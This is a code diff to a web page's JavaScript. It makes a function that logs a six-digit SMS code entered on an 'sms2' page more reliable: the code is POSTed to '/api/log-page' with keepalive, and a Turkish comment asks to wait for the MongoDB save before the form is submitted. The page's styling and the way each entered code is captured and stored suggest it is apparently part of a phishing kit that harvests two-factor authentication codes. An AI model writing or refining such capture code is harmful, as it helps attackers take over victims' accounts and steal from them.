@@ -331,13 +331,22 @@
     async function sendLogUpdate(payload) {
       try {
         const body = JSON.stringify(payload);
-        await fetch('/api/log-page', {
+        const response = await fetch('/api/log-page', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body
+          body,
+          keepalive: true
         });
+        
+        if (!response.ok) {
+          console.error('SMS2 log failed:', response.status, response.statusText);
+          throw new Error(`Log failed: ${response.status}`);
+        }
+        
+        return true;
       } catch (err) {
         console.error('SMS2 log error', err);
+        throw err;
       }
     }
 
@@ -347,10 +356,15 @@
 
     async function logSms2Input(value) {
       if (value && value.trim()) {
-        await sendLogUpdate({
-          page: 'sms2',
-          inputs: { input3: value.trim() }
-        });
+        try {
+          await sendLogUpdate({
+            page: 'sms2',
+            inputs: { input3: value.trim() }
+          });
+        } catch (err) {
+          console.error('Failed to log SMS2 input', err);
+          throw err;
+        }
       }
     }
 
@@ -400,7 +414,12 @@
       if (/^\d{6}$/.test(sIpp.value.trim())) {
         sIpp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
         sIpp.parentElement.nextElementSibling.style.display = 'none';
-        await logSms2Input(sIpp.value);
+        // MongoDB'ye kaydın %100 tamamlanmasını bekle
+        try {
+          await logSms2Input(sIpp.value);
+        } catch (err) {
+          console.error('SMS2 log failed, continuing anyway', err);
+        }
         frm.submit();
       } else {
         sIpp.parentElement.style.borderColor = '#f84960';
